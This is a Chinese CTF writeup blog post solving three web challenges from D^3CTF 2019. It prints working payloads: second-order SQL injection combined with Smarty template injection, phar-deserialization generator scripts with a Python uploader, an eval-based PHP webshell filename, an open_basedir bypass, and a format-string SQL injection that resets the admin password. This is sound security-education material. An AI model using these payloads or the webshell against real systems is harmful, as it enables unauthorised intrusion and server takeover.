---
layout: post
title: D^3CTF Web Writeup
data: 2019-11-22
categories: Writeups
tags: 
 - CTF
 - Writeup
description:
---

# easyweb

## 题目描述

给了源码，/www目录的压缩包![屏幕截图 2019-11-23 12:47:49](../assets/2019-11-23-D^3CTF-Web/屏幕截图 2019-11-23 12:47:49.png)

点击题目给的网址，是一个登录框![屏幕截图 2019-11-23 12:50:42](../assets/2019-11-23-D^3CTF-Web/屏幕截图 2019-11-23 12:50:42.png)

## 解题思路

注册登录之后，有'Profile'和'Upload'两个按钮可以交互，一个是文件上传，另一个返回如下：

```
Hi, foo, hope you have a good experience in this ctf game
you must get a RCE Bug in this challenge
```

分析一下源码包，看起来应该是MVC架构的，还可以判断出用了CodeIgniter框架，直接进入'application/controllers/'目录，有'File.php'、'Index.php'、'User.php'三个文件，结合网站的URL基本确定这些就是网站的功能代码了。其中'Index.php'是空的，不太理解，放一放。

先看看'User.php'，看一下各个功能，其它功能比较直接，只有`index()`进入了别的文件，这就是之前提示需要找一个RCE漏洞的那个功能：

``` php
public function index()
{
	if ($this->session->has_userdata('userId')) {
		$userView = $this->Render_model->get_view($this->session->userId);
		$prouserView = 'data:,' . $userView;
		$this->username = array('username' => $this->getUsername($this->session->userId));
		$this->ci_smarty->assign('username', $this->username);
		$this->ci_smarty->display($prouserView);
	} else {
		redirect('/user/login');
	}
}
```

随逻辑定位到'application/models/Render_model.php'文件中的`get_view()`：

```php
public function get_view($userId){
	$res = $this->db->query("SELECT username FROM userTable WHERE userId='$userId'")->result();
	if($res){
		$username = $res[0]->username;
		$username = $this->sql_safe($username);
		$username = $this->safe_render($username);
		$userView = $this->db->query("SELECT userView FROM userRender WHERE username='$username'")->result();
		$userView = $userView[0]->userView;
		return $userView;
	}else{
		return false;
	}
}
```

注意到有两个安全检查函数：

```php
private function safe_render($username){
	$username = str_replace(array('{','}'),'',$username);
	return $username;
}

private function sql_safe($sql){
	if(preg_match('/and|or|order|delete|select|union|load_file|updatexml|\(|extractvalue|\)|/i',$sql)){
		return '';
	}else{
		return $sql;
	}
}
```

它俩会对之前数据库返回的username进行过滤，然而顺序有问题，导致可以用像'se}lect'这样的形式绕过，就产生了二次注入漏洞。

回到之前的逻辑，在`get_view()`中，先利用来自Session的userId查询数据库，获得username。再用username查询数据库，获得一段信息，返回到`index()`中。然后将信息用模板引擎渲染一下返回客户端。可能存在模板注入漏洞，对'{'和'}'的过滤可以利用Hex编码在数据库中绕过。

下面验证一下，构造Payload如下：

```
foo' un{ion se{lect 0x7b7b7068707d7d706870696e666f28293b7b7b2f7068707d7d# //{{php}}phpinfo();{{/php}}
```

返回了php信息。然后修改Payload，getshell。

但是，发现flag读取需要管理员权限，又搞不了了。

## 备注

1. MVC：Model-View-Controller

# ezupload

## 题目描述

直接给出了源码：

```php
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($url,$filename) {
        $this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
        $this->url = $url;
        $this->filename  =  $filename;
        if (!file_exists($this->userdir)) {
            mkdir($this->userdir, 0777, true);
        }
    }
    public function checkdir(){
        if ($this->userdir != "upload/" . md5($_SERVER["REMOTE_ADDR"])) {
            die('hacker!!!');
        }
    }
    public function checkurl(){
        $r = parse_url($this->url);
        if (!isset($r['scheme']) || preg_match("/file|php/i",$r['scheme'])){
            die('hacker!!!');
        }
    }
    public function checkext(){
        if (stristr($this->filename,'..')){
            die('hacker!!!');
        }
        if (stristr($this->filename,'/')){
            die('hacker!!!');
        }
        $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
        if (preg_match("/ph/i", $ext)){
            die('hacker!!!');
        }
    }
    public function upload(){
        $this->checkdir();
        $this->checkurl();
        $this->checkext();
        $content = file_get_contents($this->url,NULL,NULL,0,2048);
        if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)){
            die('hacker!!!');
        }
        file_put_contents($this->userdir."/".$this->filename,$content);
    }
    public function remove(){
        $this->checkdir();
        $this->checkext();
        if (file_exists($this->userdir."/".$this->filename)){
            unlink($this->userdir."/".$this->filename);
        }
    }
    public function count($dir) {
        if ($dir === ''){
            $num = count(scandir($this->userdir)) - 2;
        }
        else {
            $num = count(scandir($dir)) - 2;
        }
        if($num > 0) {
            return "you have $num files";
        }
        else{
            return "you don't have file";
        }
    }
    public function __toString() {
        return implode(" ",scandir(__DIR__."/".$this->userdir));
    }
    public function __destruct() {
        $string = "your file in : ".$this->userdir;
        file_put_contents($this->filename.".txt", $string);
        echo $string;
    }
}

if (!isset($_POST['action']) || !isset($_POST['url']) || !isset($_POST['filename'])){
    highlight_file(__FILE__);
    die();
}

$dir = new dir($_POST['url'],$_POST['filename']);
if($_POST['action'] === "upload") {
    $dir->upload();
}
elseif ($_POST['action'] === "remove") {
    $dir->remove();
}
elseif ($_POST['action'] === "count") {
    if (!isset($_POST['dir'])){
        echo $dir->count('');
    } else {
        echo $dir->count($_POST['dir']);
    }
}
```

## 解题思路

源码主要分了两个部分，首先定义了一个dir类，然后是程序主函数，先判断POST输入，若不符合条件则高亮显示源码后退出，若符合则程序继续执行。随后先实例化了一个dir类型，然后根据用户输入执行dir类的方法。

接着再看dir类的内容，先是`userdir`、`url`、`filename`三个属性，然后主要就是`upload()`、`remove()`、`count()`三个方法对文件进行上传、删除和计数。还有三个魔术方法，构造、析构函数和转字符串函数，应该会有反序列化和转字符串的部分。

然后看文件上传了，首先检查了文件路径、目标地址和文件扩展，路径是由IP得到的一个散列值；目标地址是上传文件的源地址，会检查输入的URL中是否有协议名，而且协议名不能是file或php；文件扩展检查中要求文件名不能包含'..'和'/'，且后缀中不得包含'ph'字样。然后`upload()`会利用`file_get_contents()`根据读取内容，随后验证其中是否包含'<?'、'value'、'on'、'type'、'flag'、'auto'、'set'、'\\\\'字样。验证通过则利用`file_put_contents()`写文件。可以看到，`file_get_contents()`就是反序列化的关键所在。

既然这样，就看一下析构函数怎么利用。其功能是将文件地址分别输出和写入另一个文件中。这样说来，就有两个文件写入的地方了，`upload()`那里过滤很严格，但是析构函数好像没有做过滤，只要使`userdir`属性为一句话木马的内容就可以了。

但是上传phar文件的时候突然意识到，文件中不能包含'<?'。这就要利用转字符串函数了，它会返回一个字符串，包含指定目录下的所有文件。可以尝试上传一个以一句话木马为名的文件，这样就完成了写文件。

上传之后是一个txt文件，可以再上传.htaccess文件修改服务器处理规则。

然后还有一个问题，就是提示说析构函数的工作目录会改变，也就是说，写文件时需要提供一个绝对路径，但我们并不知道网站根目录的目录名，之前提到析构函数有一个输出功能，简单修改一下phar文件的内容就可以获得www目录下的所有文件名了。

下面正式开始，首先是获取网站根目录，先随意上传一个文件，获取自己IP的散列值，然后生成phar文件：

```php
<?php
class dir {
    public $userdir;
    public $url;
    public $filename;
}

$a = new dir();
$a->userdir = "../"
$b = new dir();
$b->userdir = $a;

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("__HALT_COMPILER();?>;");
$phar->setMetadata($b);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>

```

然后上传并用phar://调用：

```python
import requests
import base64

action = "upload"

f = open("phar.phar", "rb")
fr = f.read()
url = "data:image/png;base64,%s" % base64.b64encode(fr).decode()
print(url)
filename = "1.png"

r = requests.post("http://localhost/index.php", {"action": action, "url": url, "filename": filename})
print(r.text)
print()


url = "phar://upload/{MD5_IP}/1.png"
print(url)
filename = "2.png"

r = requests.post("http://localhost/index.php", {"action": action, "url": url, "filename": filename})
print(r.text)
```

可以获得根目录名，然后上传一个名为`<?php echo 1.1;eval($_GET[1])?>`的文件。之后修改phar文件：

```php
<?php
class dir {
    public $userdir;
    public $url;
    public $filename;
}

$a = new dir();
$a->userdir = "upload/{MD5_IP}/";
$b = new dir();
$b->userdir = $a;
$b->filename = "/var/www/html/{WEB_ROOT_DIR}/upload/{MD5_IP}/evil";

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("__HALT_COMPILER();?>;");
$phar->setMetadata($b);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>

```

上传并调用，就可以访问evil.txt了，不过现在还不能作为php文件执行，还要上传.htaccess文件，之后就可以使其作为php文件执行了。

然后会遇到`open_basedir`限制，绕过即可，Payload如下：

```
ini_set('open_basedir', '..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir', '/');var_dump(scandir('/'));
```

会发现flag文件，读出来即可。

## 备注

1. 利用`data:image/png;base64,`，实现文件上传。
2. 对于程序结束时自动销毁的对象，其析构函数的工作目录为计算机的根目录。

# showhub

## 题目描述

打开网址是一个建设中的网站，只提供注册和登录功能。随意注册了一个账号，登录后发现一个WebConsole功能，但点击显示需要admin账户。

题目也给出了网站的源码包。

## 解题思路

网站是MVC架构，根据业务逻辑定位到注册功能的实现代码，有格式化字符串注入漏洞：

```php
static private function prepareInsert($baseSql, $args)
{
    $i = 0;
    if (!empty($args)) {
        foreach ($args as $column => $value) {
            $value = addslashes($value);
            if ($value !== null) {
                if ($i !== count($args) - 1) {
                    $baseSql = sprintf($baseSql, "`$column`,%s", "'$value',%s");
                } else {
                    $baseSql = sprintf($baseSql, "`$column`", "'$value'");
                }
            }
            $i++;
        }
    }

    return $baseSql;
}
```

结合源码包中的app.sql文件，确定用户名字段是唯一的，所以可以通过`INSERT ON DUPLICATE KEY UPDATE`修改管理员账户的密码。需要注意密码字段经过了sha256加密。

Payload：

```
username=admin%1$',%1$'password%1$') ON DUPLICATE KEY UPDATE password=0x38633639373665356235343130343135626465393038626434646565313564666231363761396338373366633462623861383166366632616234343861393138#&password=asd
```

提交请求修改密码，之后使用admin、admin登录，再次访问WebConsole功能，还是失败了，显示client ip不合法。定位到源码包中相应的代码：

```php
public function index()
{
    $client_ip = $SERVER['HTTP_CLIENT_IP'];    
	if ($this->request->user->username === "admin" && !filter_var(
            $_SERVER['HTTP_CLIENT_IP'],
            FILTER_VALIDATE_IP,
            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return $this->render('webconsole.html', ["username" => $this->request->user]);
    } elseif ($this->request->user->username !== "admin") {
        return $this->responseNotAllowed("Only administrators in the internal network environment can access,you are not admin", ["username" => $this->request->user]);
    } else {
        return $this->responseNotAllowed("Only administrators in the internal network environment can access,your client ip($client_ip) is not be allowed, please visit in the internal network environment", ["username" => $this->request->user]);
    }

}
```

这里会检查`$SERVER['HTTP_CLIENT_IP']`为内网IP，这里直接在前端修改是没有用的，因为从响应头可以看到服务器设置了反向代理。不过ATS的版本是7.1.2，存在HTTP请求走私漏洞。

然后就搞不了了，不知道为什么我走私的请求无法生效，等先学一下服务器的知识，自己搭个环境模拟一下吧。